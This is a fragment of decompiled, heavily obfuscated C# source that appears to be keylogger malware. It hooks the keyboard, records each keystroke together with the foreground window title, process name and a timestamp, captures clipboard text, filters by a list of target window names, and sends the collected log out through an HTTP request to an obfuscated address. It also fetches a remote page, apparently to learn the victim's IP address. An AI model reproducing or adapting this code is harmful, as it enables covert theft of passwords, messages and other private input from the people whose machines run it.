						num = (num2 * 1980075348u ^ 4279510359u);
						continue;
					}
					goto Block_2;
				}
			}
			Block_2:
			Stream requestStream = httpWebRequest.GetRequestStream();
			try
			{
				requestStream.Write(bytes, 0, bytes.Length);
				WebResponse response = httpWebRequest.GetResponse();
				try
				{
					Stream responseStream = response.GetResponseStream();
					try
					{
						StreamReader streamReader = new StreamReader(responseStream);
						try
						{
							streamReader.ReadToEnd();
							for (;;)
							{
								IL_18E:
								uint num3 = 2367434439u;
								for (;;)
								{
									uint num2;
									switch ((num2 = (num3 ^ 4196697267u)) % 3u)
									{
									case 0u:
										goto IL_18E;
									case 2u:
										streamReader.Close();
										num3 = (num2 * 2724085510u ^ 496175684u);
										continue;
									}
									goto Block_12;
								}
							}
							Block_12:;
						}
						finally
						{
							if (streamReader != null)
							{
								for (;;)
								{
									IL_1D8:
									uint num4 = 4002533231u;
									for (;;)
									{
										uint num2;
										switch ((num2 = (num4 ^ 4196697267u)) % 3u)
										{
										case 1u:
											((IDisposable)streamReader).Dispose();
											num4 = (num2 * 2793353157u ^ 317828063u);
											continue;
										case 2u:
											goto IL_1D8;
										}
										goto Block_15;
									}
								}
								Block_15:;
							}
						}
						responseStream.Flush();
						responseStream.Close();
					}
					finally
					{
						if (responseStream != null)
						{
							for (;;)
							{
								IL_231:
								uint num5 = 3929775597u;
								for (;;)
								{
									uint num2;
									switch ((num2 = (num5 ^ 4196697267u)) % 3u)
									{
									case 0u:
										goto IL_231;
									case 1u:
										((IDisposable)responseStream).Dispose();
										num5 = (num2 * 2039401819u ^ 3383402113u);
										continue;
									}
									goto Block_18;
								}
							}
							Block_18:;
						}
					}
					response.Close();
				}
				finally
				{
					if (response != null)
					{
						for (;;)
						{
							IL_283:
							uint num6 = 2607302018u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num6 ^ 4196697267u)) % 3u)
								{
								case 0u:
									goto IL_283;
								case 1u:
									((IDisposable)response).Dispose();
									num6 = (num2 * 767216798u ^ 2224947427u);
									continue;
								}
								goto Block_21;
							}
						}
						Block_21:;
					}
				}
				requestStream.Flush();
				for (;;)
				{
					IL_2CF:
					uint num7 = 2744941119u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num7 ^ 4196697267u)) % 3u)
						{
						case 0u:
							goto IL_2CF;
						case 1u:
							requestStream.Close();
							num7 = (num2 * 2483104974u ^ 1432671652u);
							continue;
						}
						goto Block_6;
					}
				}
				Block_6:;
			}
			finally
			{
				if (requestStream != null)
				{
					for (;;)
					{
						IL_31C:
						uint num8 = 3158645091u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num8 ^ 4196697267u)) % 3u)
							{
							case 1u:
								((IDisposable)requestStream).Dispose();
								num8 = (num2 * 1167187984u ^ 3335432336u);
								continue;
							case 2u:
								goto IL_31C;
							}
							goto Block_24;
						}
					}
					Block_24:;
				}
			}
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_368:
				uint num9 = 3679662219u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num9 ^ 4196697267u)) % 3u)
					{
					case 1u:
						num9 = (num2 * 1964367504u ^ 4095208286u);
						continue;
					case 2u:
						goto IL_368;
					}
					goto Block_26;
				}
			}
			Block_26:;
		}
		string result;
		return result;
	}

	// Token: 0x06000073 RID: 115 RVA: 0x0001F570 File Offset: 0x0001D770
	private static string bmy()
	{
		string result;
		try
		{
			string text = new WebClient().DownloadString(<Module>.smethod_0(580912));
			text = new Regex(<Module>.smethod_0(580960)).Matches(text)[0].ToString();
			result = text;
		}
		catch (Exception ex)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x17000006 RID: 6
	// (get) Token: 0x06000074 RID: 116 RVA: 0x0001F5D8 File Offset: 0x0001D7D8
	// (set) Token: 0x06000075 RID: 117 RVA: 0x0001F5EC File Offset: 0x0001D7EC
	private static afg.ux cgl
	{
		get
		{
			return afg.cfs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (afg.cfs != null)
			{
				goto IL_5F;
			}
			goto IL_105;
			uint num2;
			for (;;)
			{
				IL_CD:
				uint num;
				switch ((num = (num2 ^ 1067145085u)) % 8u)
				{
				case 0u:
					if (afg.cfs != null)
					{
						num2 = (num * 1403794438u ^ 1999634652u);
						continue;
					}
					break;
				case 1u:
					afg.cfs.ack += afg.bnp;
					num2 = (num * 1455091359u ^ 43361441u);
					continue;
				case 3u:
					afg.cfs.acg += afg.bmq;
					num2 = (num * 1980732399u ^ 2565835570u);
					continue;
				case 4u:
					goto IL_5F;
				case 5u:
					goto IL_105;
				case 6u:
					afg.cfs.ack -= afg.bnp;
					num2 = (num * 3831547738u ^ 1606210062u);
					continue;
				case 7u:
					afg.cfs.acg -= afg.bmq;
					num2 = (num * 3844873211u ^ 2678714925u);
					continue;
				}
				break;
			}
			return;
			IL_5F:
			num2 = 363656643u;
			goto IL_CD;
			IL_105:
			afg.cfs = value;
			num2 = 1437328421u;
			goto IL_CD;
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x0001F70C File Offset: 0x0001D90C
	private static void bmq(object bmz, ref afg.ux.tz bno)
	{
		if (bno.Button == MouseButtons.Right)
		{
			for (;;)
			{
				IL_4A:
				uint num = 1077958302u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1033211578u)) % 3u)
					{
					case 0u:
						goto IL_4A;
					case 2u:
						bno.uy = true;
						num = (num2 * 3327261510u ^ 1284042058u);
						continue;
					}
					goto Block_2;
				}
			}
			Block_2:;
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x0001F76C File Offset: 0x0001D96C
	private static void bnp(object bnr, ref afg.ux.tz bns)
	{
	}

	// Token: 0x17000007 RID: 7
	// (get) Token: 0x06000078 RID: 120 RVA: 0x0001F77C File Offset: 0x0001D97C
	// (set) Token: 0x06000079 RID: 121 RVA: 0x0001F790 File Offset: 0x0001D990
	private static afg.acm cgm
	{
		get
		{
			return afg.cft;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (afg.cft != null)
			{
				goto IL_75;
			}
			goto IL_AA;
			uint num2;
			for (;;)
			{
				IL_7A:
				uint num;
				switch ((num = (num2 ^ 2380866873u)) % 6u)
				{
				case 0u:
					goto IL_75;
				case 2u:
					if (afg.cft != null)
					{
						num2 = (num * 3793789817u ^ 2672509465u);
						continue;
					}
					break;
				case 3u:
					afg.cft.adf -= afg.bnt;
					num2 = (num * 89346097u ^ 3640929311u);
					continue;
				case 4u:
					afg.cft.adf += afg.bnt;
					num2 = (num * 2624062809u ^ 3484265532u);
					continue;
				case 5u:
					goto IL_AA;
				}
				break;
			}
			return;
			IL_75:
			num2 = 2250201874u;
			goto IL_7A;
			IL_AA:
			afg.cft = value;
			num2 = 3463649757u;
			goto IL_7A;
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x0001F854 File Offset: 0x0001DA54
	private static void bnt(afg.acm bnu)
	{
		string text = hj.hk.Clipboard.GetText();
		text = text.Replace("&", <Module>.smethod_0(580880));
		for (;;)
		{
			IL_100:
			uint num = 3159565881u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 4062684255u)) % 5u)
				{
				case 0u:
					if (Operators.CompareString(text, "", false) != 0)
					{
						num = (num2 * 2937869362u ^ 3067924080u);
						continue;
					}
					break;
				case 1u:
					text = text.Replace("<", <Module>.smethod_0(580672));
					text = text.Replace(">", <Module>.smethod_0(580720));
					text = text.Replace("\"", <Module>.smethod_0(580512));
					num = (num2 * 1471439796u ^ 85746010u);
					continue;
				case 3u:
					afg.cdv = afg.cdv + <Module>.smethod_0(579408) + text + <Module>.smethod_0(579456);
					num = (num2 * 984572440u ^ 380790743u);
					continue;
				case 4u:
					goto IL_100;
				}
				return;
			}
		}
	}

	// Token: 0x17000008 RID: 8
	// (get) Token: 0x0600007B RID: 123 RVA: 0x0001F968 File Offset: 0x0001DB68
	// (set) Token: 0x0600007C RID: 124 RVA: 0x0001F97C File Offset: 0x0001DB7C
	private static afg.adm cgn
	{
		get
		{
			return afg.cfu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (afg.cfu != null)
			{
				goto IL_2F;
			}
			goto IL_A0;
			uint num2;
			for (;;)
			{
				IL_70:
				uint num;
				switch ((num = (num2 ^ 4098378912u)) % 6u)
				{
				case 0u:
					if (afg.cfu != null)
					{
						num2 = (num * 2959735954u ^ 1746718851u);
						continue;
					}
					break;
				case 1u:
					goto IL_A0;
				case 3u:
					afg.adm.aeq += afg.bwz;
					num2 = (num * 2577462877u ^ 108810729u);
					continue;
				case 4u:
					goto IL_2F;
				case 5u:
					afg.adm.aeq -= afg.bwz;
					num2 = (num * 3421310848u ^ 3251011335u);
					continue;
				}
				break;
			}
			return;
			IL_2F:
			num2 = 3036140847u;
			goto IL_70;
			IL_A0:
			afg.cfu = value;
			num2 = 2555482354u;
			goto IL_70;
		}
	}

	// Token: 0x0600007D RID: 125
	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	// Token: 0x0600007E RID: 126
	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr bnw, StringBuilder bnq, int bnz);

	// Token: 0x0600007F RID: 127
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowTextLength(IntPtr bor);

	// Token: 0x06000080 RID: 128
	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] bot);

	// Token: 0x06000081 RID: 129
	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint bov, uint boy);

	// Token: 0x06000082 RID: 130
	[DllImport("psapi.dll")]
	public static extern bool EnumProcessModules(IntPtr bow, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In] [Out] uint[] boq, uint boz, [MarshalAs(UnmanagedType.U4)] ref uint bpr);

	// Token: 0x06000083 RID: 131
	[DllImport("psapi.dll")]
	public static extern uint GetModuleFileNameEx(IntPtr bpt, IntPtr bpu, [Out] StringBuilder bpv, [MarshalAs(UnmanagedType.U4)] [In] int bpy);

	// Token: 0x06000084 RID: 132
	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr bpw, ref int bpq);

	// Token: 0x06000085 RID: 133
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetKeyboardLayout(int brs);

	// Token: 0x06000086 RID: 134
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ToUnicodeEx(uint bru, uint brv, byte[] bry, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder brx, int brw, uint brq, IntPtr brz);

	// Token: 0x06000087 RID: 135 RVA: 0x0001FA38 File Offset: 0x0001DC38
	private static string bst(int bsu)
	{
		try
		{
			return Process.GetProcessById(bsu).MainModule.FileName;
		}
		catch (Exception ex)
		{
			string result;
			for (;;)
			{
				IL_17C:
				uint num = 3756571530u;
				for (;;)
				{
					uint num2;
					StringBuilder stringBuilder;
					switch ((num2 = (num ^ 2177641699u)) % 10u)
					{
					case 0u:
					{
						Process processById;
						uint[] array;
						int num3;
						afg.GetModuleFileNameEx(processById.Handle, (IntPtr)((long)((ulong)array[num3])), stringBuilder, stringBuilder.Capacity);
						result = stringBuilder.ToString();
						num = (num2 * 1204900528u ^ 358270470u);
						continue;
					}
					case 1u:
					{
						Process processById = Process.GetProcessById(bsu);
						uint[] array = new uint[1024];
						num = (num2 * 3467699342u ^ 2866724105u);
						continue;
					}
					case 2u:
					{
						int num3;
						int num4;
						if (num3 > num4)
						{
							num = 3155062743u;
							continue;
						}
						goto IL_65;
					}
					case 3u:
						goto IL_186;
					case 5u:
					{
						uint num6;
						int num5 = checked((int)Math.Round(num6 / (double)Marshal.SizeOf(typeof(IntPtr))));
						num = (num2 * 3453104731u ^ 132725919u);
						continue;
					}
					case 6u:
						goto IL_17C;
					case 7u:
					{
						int num7 = 0;
						int num5;
						int num4 = num5;
						int num3 = num7;
						num = (num2 * 588808977u ^ 3067743992u);
						continue;
					}
					case 8u:
					{
						uint[] array;
						uint boz = checked((uint)(Marshal.SizeOf(typeof(IntPtr)) * array.Length));
						uint num6 = 0u;
						Process processById;
						afg.EnumProcessModules(processById.Handle, array, boz, ref num6);
						num = (num2 * 2881674001u ^ 2475173840u);
						continue;
					}
					case 9u:
						goto IL_65;
					}
					goto Block_3;
					IL_65:
					stringBuilder = new StringBuilder(1024);
					num = 4133110273u;
				}
			}
			Block_3:
			goto IL_18D;
			IL_186:
			return result;
			IL_18D:;
		}
		return null;
	}

	// Token: 0x06000088 RID: 136 RVA: 0x0001FBF8 File Offset: 0x0001DDF8
	private static string btw()
	{
		string result = "";
		try
		{
			string processName = Process.GetProcessById(afg.cfx).ProcessName;
			string productName = FileVersionInfo.GetVersionInfo(afg.bst(afg.cfx)).ProductName;
			if (productName != null | Operators.CompareString(productName, "", false) != 0)
			{
				goto IL_50;
			}
			goto IL_9F;
			uint num2;
			for (;;)
			{
				IL_73:
				uint num;
				switch ((num = (num2 ^ 1900178701u)) % 5u)
				{
				case 0u:
					goto IL_9F;
				case 1u:
					result = processName + ": ";
					num2 = (num * 44881380u ^ 3505031496u);
					continue;
				case 2u:
					goto IL_50;
				case 4u:
					goto IL_BD;
				}
				break;
			}
			goto IL_CB;
			IL_BD:
			return productName + ": ";
			IL_50:
			num2 = 126991028u;
			goto IL_73;
			IL_9F:
			if (processName != null | Operators.CompareString(processName, "", false) != 0)
			{
				num2 = 423793841u;
				goto IL_73;
			}
			IL_CB:;
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000089 RID: 137 RVA: 0x0001FCF4 File Offset: 0x0001DEF4
	private static string buw()
	{
		afg.cfy = afg.GetForegroundWindow();
		afg.GetWindowThreadProcessId(afg.cfy, ref afg.cfx);
		StringBuilder stringBuilder;
		for (;;)
		{
			IL_77:
			uint num = 3109580464u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3813526497u)) % 4u)
				{
				case 0u:
					goto IL_77;
				case 1u:
				{
					int num3 = checked(afg.GetWindowTextLength(afg.cfy) + 1);
					stringBuilder = new StringBuilder(num3);
					if (afg.GetWindowText(afg.cfy, stringBuilder, num3) > 0)
					{
						num = (num2 * 1171024920u ^ 2368626207u);
						continue;
					}
					break;
				}
				case 2u:
					goto IL_7E;
				}
				goto Block_2;
			}
		}
		Block_2:
		goto IL_85;
		IL_7E:
		return stringBuilder.ToString();
		IL_85:
		return null;
	}

	// Token: 0x0600008A RID: 138 RVA: 0x0001FD88 File Offset: 0x0001DF88
	private static void bvx()
	{
		if (Operators.CompareString(afg.cgh, afg.cfv, false) != 0)
		{
			for (;;)
			{
				IL_16A:
				uint num = 498712386u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2031721523u)) % 9u)
					{
					case 0u:
					{
						string[] array;
						array[4] = <Module>.smethod_0(579216);
						array[5] = DateTime.Now.ToString(<Module>.smethod_0(579008));
						array[6] = <Module>.smethod_0(579056);
						num = (num2 * 2304302095u ^ 334869436u);
						continue;
					}
					case 1u:
					{
						string[] array;
						array[0] = <Module>.smethod_0(579248);
						num = (num2 * 2803804265u ^ 1098494278u);
						continue;
					}
					case 2u:
					{
						string[] array;
						array[1] = afg.btw();
						num = (num2 * 212733562u ^ 1239706349u);
						continue;
					}
					case 3u:
					{
						string[] array;
						afg.cgk = string.Concat(array);
						num = (num2 * 1855919367u ^ 2185419141u);
						continue;
					}
					case 4u:
						afg.cdv += afg.cgk;
						afg.cgh = afg.cfv;
						num = (num2 * 20941895u ^ 3432477874u);
						continue;
					case 5u:
						goto IL_16A;
					case 6u:
					{
						string[] array = new string[7];
						num = (num2 * 2656055814u ^ 332967239u);
						continue;
					}
					case 7u:
					{
						string[] array;
						array[2] = <Module>.smethod_0(579296);
						array[3] = afg.cfv;
						num = (num2 * 1966832204u ^ 4108026943u);
						continue;
					}
					}
					goto Block_2;
				}
			}
			Block_2:;
		}
	}

	// Token: 0x0600008B RID: 139 RVA: 0x0001FF08 File Offset: 0x0001E108
	private static bool bvz()
	{
		int num = 0;
		checked
		{
			int num2 = afg.cfz.Length - 1;
			int num3 = num;
			for (;;)
			{
				IL_71:
				if (num3 <= num2)
				{
					goto IL_50;
				}
				int num4 = -1823931964;
				for (;;)
				{
					IL_1E:
					switch ((num4 ^ -127403253) % 6)
					{
					case 0:
						goto IL_0E;
					case 2:
						return true;
					case 3:
						goto IL_71;
					case 4:
						num4 = -1503550294;
						continue;
					case 5:
						goto IL_50;
					}
					return false;
				}
				IL_0E:
				num3++;
				num4 = -1044426152;
				goto IL_1E;
				IL_50:
				if (afg.cfv.ToLower().Contains(afg.cfz[num3]))
				{
					num4 = -550410291;
					goto IL_1E;
				}
				goto IL_0E;
			}
			return false;
		}
	}

	// Token: 0x0600008C RID: 140 RVA: 0x0001FF90 File Offset: 0x0001E190
	private static bool byz()
	{
		string processName = Process.GetProcessById(afg.cfx).ProcessName;
		int num = 0;
		checked
		{
			int num2 = afg.cfz.Length - 1;
			int num3 = num;
			for (;;)
			{
				IL_81:
				if (num3 <= num2)
				{
					goto IL_60;
				}
				int num4 = 617438763;
				for (;;)
				{
					IL_2E:
					switch ((num4 ^ 984819861) % 6)
					{
					case 0:
						num4 = 1239206042;
						continue;
					case 1:
						goto IL_81;
					case 3:
						goto IL_60;
					case 4:
						return true;
					case 5:
						goto IL_1E;
					}
					return false;
				}
				IL_1E:
				num3++;
				num4 = 994183202;
				goto IL_2E;
				IL_60:
				if (Operators.CompareString(processName.ToLower(), afg.cfz[num3], false) == 0)
				{
					num4 = 1897635887;
					goto IL_2E;
				}
				goto IL_1E;
			}
			return false;
		}
	}

	// Token: 0x0600008D RID: 141 RVA: 0x00020028 File Offset: 0x0001E228
	private static void bwz(Keys bqz)
	{
		try
		{
			afg.cfv = afg.buw();
			if (afg.cfq)
			{
				goto IL_548;
			}
			goto IL_AFE;
			uint num2;
			for (;;)
			{
				IL_91F:
				uint num;
				switch ((num = (num2 ^ 3965608944u)) % 113u)
				{
				case 0u:
					goto IL_14D;
				case 1u:
					if (afg.cfz.Length > 0)
					{
						num2 = (num * 1075549077u ^ 880841859u);
						continue;
					}
					goto IL_AFE;
				case 2u:
					goto IL_371;
				case 3u:
					goto IL_B1;
				case 4u:
					goto IL_B0D;
				case 5u:
					goto IL_B2B;
				case 6u:
					num2 = (num * 205664061u ^ 3285804523u);
					continue;
				case 7u:
					goto IL_B49;
				case 8u:
					goto IL_B67;
				case 9u:
					if (bqz.ToString().ToLower().Contains(<Module>.smethod_0(576048)))
					{
						num2 = (num * 1588124495u ^ 1900373153u);
						continue;
					}
					goto IL_D11;
				case 11u:
					afg.cdv += <Module>.smethod_0(577712);
					num2 = (num * 205039359u ^ 1661763793u);
					continue;
				case 12u:
					if (afg.cef == Conversions.ToBoolean(<Module>.smethod_0(579872)))
					{
						num2 = (num * 2674187149u ^ 3228800360u);
						continue;
					}
					goto IL_19;
				case 13u:
					goto IL_A2;
				case 15u:
					goto IL_B8F;
				case 16u:
					goto IL_BAD;
				case 17u:
					goto IL_BCB;
				case 18u:
					goto IL_BE9;
				case 19u:
					if (afg.cfz.Length > 0)
					{
						num2 = (num * 794240177u ^ 1038534525u);
						continue;
					}
					goto IL_AFE;
				case 20u:
					afg.cdv += <Module>.smethod_0(578128);
					num2 = (num * 4113100049u ^ 503733643u);
					continue;
				case 21u:
					afg.cdv += <Module>.smethod_0(577296);
					afg.cdv += <Module>.smethod_0(577088);
					num2 = (num * 3576360116u ^ 1782698636u);
					continue;
				case 22u:
					goto IL_362;
				case 23u:
					if (bqz == Keys.Back)
					{
						num2 = (num * 2986662836u ^ 1531180599u);
						continue;
					}
					goto IL_383;
				case 24u:
					goto IL_84;
				case 25u:
					goto IL_C07;
				case 26u:
					goto IL_C25;
				case 27u:
					goto IL_12E;
				case 28u:
					afg.cdv += <Module>.smethod_0(576016);
					num2 = (num * 1315323425u ^ 2313923467u);
					continue;
				case 29u:
					afg.cdv += <Module>.smethod_0(576672);
					num2 = (num * 1579650821u ^ 4070839606u);
					continue;
				case 30u:
					num2 = (num * 3754673502u ^ 1499077267u);
					continue;
				case 31u:
					goto IL_48;
				case 33u:
					goto IL_3E3;
				case 34u:
					goto IL_C48;
				case 35u:
					afg.cdv += <Module>.smethod_0(577680);
					num2 = (num * 4207045307u ^ 657791116u);
					continue;
				case 36u:
					goto IL_75;
				case 37u:
					goto IL_93;
				case 38u:
					if (afg.cfw == 1)
					{
						num2 = (num * 1005013618u ^ 3540546935u);
						continue;
					}
					goto IL_625;
				case 39u:
					goto IL_2F6;
				case 40u:
					goto IL_66;
				case 41u:
					afg.cdv += afg.cdg(checked((uint)bqz)).ToUpper();
					num2 = (num * 560549825u ^ 1066599052u);
					continue;
				case 42u:
					goto IL_3FA;
				case 43u:
					afg.cdv += <Module>.smethod_0(577328);
					num2 = (num * 2082094146u ^ 2888707941u);
					continue;
				case 44u:
					goto IL_323;
				case 45u:
					afg.cdv += <Module>.smethod_0(576832);
					num2 = (num * 4134432618u ^ 3817198203u);
					continue;
				case 46u:
					goto IL_212;
				case 47u:
					afg.cdv += " ";
					num2 = (num * 2764854068u ^ 2004377123u);
					continue;
				case 48u:
					goto IL_16C;
				case 49u:
					goto IL_C66;
				case 50u:
					goto IL_C7B;
				case 51u:
					goto IL_625;
				case 52u:
					goto IL_3D4;
				case 53u:
					goto IL_1E7;
				case 55u:
					goto IL_18B;
				case 57u:
					afg.cdv += <Module>.smethod_0(576880);
					num2 = (num * 705803947u ^ 3166945537u);
					continue;
				case 58u:
					goto IL_1B9;
				case 59u:
					goto IL_305;
				case 61u:
					goto IL_2C6;
				case 62u:
					goto IL_2D8;
				case 63u:
					goto IL_CA8;
				case 64u:
					goto IL_41A;
				case 65u:
					goto IL_3C5;
				case 67u:
					afg.cdv += afg.cdg(checked((uint)bqz)).ToLower();
					num2 = (num * 3609363493u ^ 2996107033u);
					continue;
				case 68u:
				{
					string left = afg.cdv.Substring(checked(afg.cdv.Length - 7));
					if (Operators.CompareString(left, <Module>.smethod_0(579840), false) != 0 & Operators.CompareString(afg.cdv.Substring(checked(afg.cdv.Length - 4)), <Module>.smethod_0(579632), false) != 0)
					{
						num2 = (num * 2919359361u ^ 2344261549u);
						continue;
					}
					break;
				}
				case 69u:
					goto IL_40B;
				case 72u:
				case 95u:
					goto IL_AFE;
				case 73u:
					goto IL_10F;
				case 74u:
					goto IL_548;
				case 75u:
					goto IL_CD0;
				case 77u:
					goto IL_CF3;
				case 78u:
					if (!afg.byz())
					{
						num2 = (num * 515714223u ^ 427381185u);
						continue;
					}
					goto IL_AFE;
				case 79u:
					afg.cdv += afg.cdg(checked((uint)bqz)).ToUpper();
					num2 = (num * 691632836u ^ 3414601583u);
					continue;
				case 80u:
					if (!afg.bvz())
					{
						num2 = (num * 474837662u ^ 1162661218u);
						continue;
					}
					goto IL_AFE;
				case 81u:
					goto IL_D11;
				case 82u:
					if (Operators.CompareString(afg.cdv.Substring(checked(afg.cdv.Length - afg.cgk.Length), afg.cgk.Length), afg.cgk, false) != 0)
					{
						num2 = (num * 765521723u ^ 4270694438u);
						continue;
					}
					break;
				case 83u:
					goto IL_D4F;
				case 84u:
					goto IL_57;
				case 85u:
					goto IL_C0;
				case 86u:
					goto IL_D6D;
				case 87u:
					goto IL_314;
				case 88u:
					goto IL_D8B;
				case 89u:
					goto IL_2E7;
				case 91u:
					goto IL_DAE;
				case 92u:
					goto IL_332;
				case 93u:
					goto IL_DCC;
				case 94u:
					goto IL_2B7;
				case 96u:
					goto IL_3A4;
				case 97u:
					goto IL_DE7;
				case 99u:
					afg.cdv = afg.cdv.Substring(0, checked(afg.cdv.Length - 1));
					num2 = (num * 1924759321u ^ 2364238009u);
					continue;
				case 100u:
					goto IL_353;
				case 102u:
					goto IL_E06;
				case 103u:
					goto IL_E21;
				case 104u:
					afg.cdv += <Module>.smethod_0(578512);
					num2 = (num * 2255621966u ^ 2114447907u);
					continue;
				case 105u:
					goto IL_383;
				case 106u:
					goto IL_344;
				case 107u:
					goto IL_2A8;
				case 108u:
					afg.cdv += <Module>.smethod_0(578016);
					num2 = (num * 3635799595u ^ 554577282u);
					continue;
				case 109u:
					num2 = (num * 452555718u ^ 1903950497u);
					continue;
				case 110u:
					afg.cdv += <Module>.smethod_0(577968);
					num2 = (num * 2251379125u ^ 3107602753u);
					continue;
				case 111u:
					goto IL_39;
				case 112u:
					goto IL_19;
				}
				break;
				IL_19:
				if (Operators.CompareString(afg.cdv, "", false) != 0)
				{
					num2 = 3568712471u;
					continue;
				}
				break;
				IL_39:
				if (bqz == Keys.F5)
				{
					num2 = 2752705078u;
					continue;
				}
				goto IL_48;
				IL_332:
				if (bqz == Keys.F4)
				{
					num2 = 2275791325u;
					continue;
				}
				goto IL_39;
				IL_323:
				if (bqz == Keys.F3)
				{
					num2 = 2702311231u;
					continue;
				}
				goto IL_332;
				IL_314:
				if (bqz == Keys.F2)
				{
					num2 = 3171185014u;
					continue;
				}
				goto IL_323;
				IL_305:
				if (bqz == Keys.F1)
				{
					num2 = 3813646710u;
					continue;
				}
				goto IL_314;
				IL_2F6:
				if (bqz == Keys.Return)
				{
					num2 = 4097487633u;
					continue;
				}
				goto IL_305;
				IL_2E7:
				if (bqz == Keys.Prior)
				{
					num2 = 3005487604u;
					continue;
				}
				goto IL_2F6;
				IL_2D8:
				if (bqz == Keys.Next)
				{
					num2 = 4131980595u;
					continue;
				}
				goto IL_2E7;
				IL_2C6:
				if (bqz == Keys.NumLock)
				{
					num2 = 3515058473u;
					continue;
				}
				goto IL_2D8;
				IL_2B7:
				if (bqz == Keys.Insert)
				{
					num2 = 3290554732u;
					continue;
				}
				goto IL_2C6;
				IL_2A8:
				if (bqz == Keys.Home)
				{
					num2 = 3645649603u;
					continue;
				}
				goto IL_2B7;
				IL_371:
				if (bqz == Keys.End)
				{
					num2 = 2684257488u;
					continue;
				}
				goto IL_2A8;
				IL_362:
				if (bqz == Keys.Delete)
				{
					num2 = 2604241802u;
					continue;
				}
				goto IL_371;
				IL_353:
				if (bqz == Keys.Right)
				{
					num2 = 2419553494u;
					continue;
				}
				goto IL_362;
				IL_344:
				if (bqz == Keys.Left)
				{
					num2 = 2449174617u;
					continue;
				}
				goto IL_353;
				IL_41A:
				if (bqz == Keys.Down)
				{
					num2 = 2351330089u;
					continue;
				}
				goto IL_344;
				IL_40B:
				if (bqz == Keys.Up)
				{
					num2 = 2579698309u;
					continue;
				}
				goto IL_41A;
				IL_3FA:
				if (bqz == Keys.Capital)
				{
					num2 = 2854489194u;
					continue;
				}
				goto IL_40B;
				IL_3E3:
				if (bqz == Keys.LWin | bqz == Keys.RWin)
				{
					num2 = 2330709240u;
					continue;
				}
				goto IL_3FA;
				IL_3D4:
				if (bqz == Keys.Escape)
				{
					num2 = 3482793544u;
					continue;
				}
				goto IL_3E3;
				IL_3C5:
				if (bqz == Keys.Tab)
				{
					num2 = 2493098734u;
					continue;
				}
				goto IL_3D4;
				IL_3A4:
				if (hj.hk.Keyboard.AltKeyDown & bqz == Keys.F4)
				{
					num2 = 3792494353u;
					continue;
				}
				goto IL_3C5;
				IL_383:
				if (hj.hk.Keyboard.AltKeyDown & bqz == Keys.Tab)
				{
					num2 = 2698369994u;
					continue;
				}
				goto IL_3A4;
				IL_48:
				if (bqz == Keys.F6)
				{
					num2 = 3796282301u;
					continue;
				}
				IL_57:
				if (bqz == Keys.F7)
				{
					num2 = 2587277649u;
					continue;
				}
				IL_66:
				if (bqz == Keys.F8)
				{
					num2 = 3205076018u;
					continue;
				}
				IL_75:
				if (bqz == Keys.F9)
				{
					num2 = 3446258767u;
					continue;
				}
				IL_84:
				if (bqz == Keys.F10)
				{
					num2 = 2419487059u;
					continue;
				}
				IL_93:
				if (bqz == Keys.F11)
				{
					num2 = 2678004775u;
					continue;
				}
				IL_A2:
				if (bqz == Keys.F12)
				{
					num2 = 4251757760u;
					continue;
				}
				IL_B1:
				if (bqz == Keys.Space)
				{
					num2 = 4125195113u;
					continue;
				}
				IL_C0:
				if (hj.hk.Keyboard.CtrlKeyDown & !hj.hk.Keyboard.AltKeyDown & bqz != Keys.Menu & bqz != Keys.LMenu & bqz != Keys.RMenu)
				{
					num2 = 3855960653u;
					continue;
				}
				IL_10F:
				checked
				{
					if (Operators.CompareString(afg.cdg((uint)bqz), "&", false) == 0)
					{
						num2 = 3521225168u;
						continue;
					}
					IL_12E:
					if (Operators.CompareString(afg.cdg((uint)bqz), "<", false) == 0)
					{
						num2 = 3365135032u;
						continue;
					}
					IL_14D:
					if (Operators.CompareString(afg.cdg((uint)bqz), ">", false) == 0)
					{
						num2 = 3123916302u;
						continue;
					}
					IL_16C:
					if (Operators.CompareString(afg.cdg((uint)bqz), "\"", false) == 0)
					{
						num2 = 2336114186u;
						continue;
					}
					IL_18B:
					if (hj.hk.Keyboard.CapsLock & !hj.hk.Keyboard.ShiftKeyDown)
					{
						num2 = 3915299020u;
						continue;
					}
					IL_1B9:
					if (!hj.hk.Keyboard.CapsLock & hj.hk.Keyboard.ShiftKeyDown)
					{
						num2 = 2365476458u;
						continue;
					}
					IL_1E7:
					if (hj.hk.Keyboard.CapsLock & hj.hk.Keyboard.ShiftKeyDown)
					{
						num2 = 3510512570u;
						continue;
					}
					IL_212:
					afg.cdv += afg.cdg((uint)bqz).ToLower();
					num2 = 4136660395u;
					continue;
					IL_625:
					if (afg.cfw != 2)
					{
						goto IL_AFE;
					}
					num2 = 2408808081u;
				}
			}
			goto IL_CC6;
			IL_B0D:
			afg.cdv += <Module>.smethod_0(578592);
			return;
